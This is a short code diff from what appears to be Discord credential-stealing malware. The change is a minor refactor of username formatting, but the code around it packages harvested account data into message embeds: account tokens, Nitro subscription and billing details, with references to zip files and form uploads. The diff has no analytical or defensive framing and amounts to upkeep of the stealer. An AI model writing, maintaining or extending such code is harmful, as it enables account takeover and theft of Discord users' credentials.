@@ -8,7 +8,7 @@ const { tempFolder } = require('../index');
 const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
 const { userAgent } = require('../config');
-const { nitroSubscriptionType, billingType, accountFlags, avatarURL, defaultAvatar } = require('../util/discord-account');
+const { nitroSubscriptionType, billingType, accountFlags, avatarURL, defaultAvatar, usernameFormat } = require('../util/discord-account');
 const { sleep } = require('../util/general');
 const { getNameAndVersion } = require('../util/os');
 
@@ -51,7 +51,7 @@ const json = async (zipFile) => {
       embeds.push({
         description: `Token: ${codeBlock(account.token)}`,
         author: {
-          name: `${account.global_name} ` + (account.discriminator === '0' ? `(@${account.username})` : `(${account.username}#${account.discriminator})`),
+          name: usernameFormat(account.global_name, account.username, account.discriminator),
           icon_url: account.avatar ? avatarURL(account.id, account.avatar) : defaultAvatar(account.id, account.discriminator)
         },
         fields: [
